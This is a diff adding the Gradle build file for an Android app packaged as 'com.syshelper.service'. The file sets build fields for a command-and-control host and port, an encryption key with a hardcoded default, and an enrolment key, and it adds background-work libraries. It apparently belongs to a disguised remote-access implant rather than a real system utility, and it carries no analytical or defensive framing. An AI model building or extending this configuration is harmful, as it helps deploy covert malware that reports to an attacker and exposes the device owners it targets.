@@ -1,0 +1,24 @@
+plugins { id 'com.android.application' }
+android {
+    namespace 'com.syshelper.service'
+    compileSdk 34
+    defaultConfig {
+        applicationId "com.syshelper.service"
+        minSdk 24
+        targetSdk 34
+        versionCode 4
+        versionName "3.0"
+        buildConfigField "String", "C2_HOST", "\"${project.findProperty("c2_host") ?: "127.0.0.1"}\""
+        buildConfigField "int", "C2_PORT", "${project.findProperty("c2_port") ?: "8230"}"
+        buildConfigField "String", "CRYPTO_KEY", "\"${project.findProperty("crypto_key") ?: "v3ilm4sk2024veil"}\""
+        buildConfigField "String", "ENROLL_KEY", "\"${project.findProperty("enroll_key") ?: "changeme"}\""
+    }
+    buildFeatures { buildConfig true }
+    buildTypes {
+        release {
+            minifyEnabled true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }
+    }
+}
+dependencies { implementation 'androidx.core:core:1.13.1'; implementation 'androidx.work:work-runtime:2.9.0' }
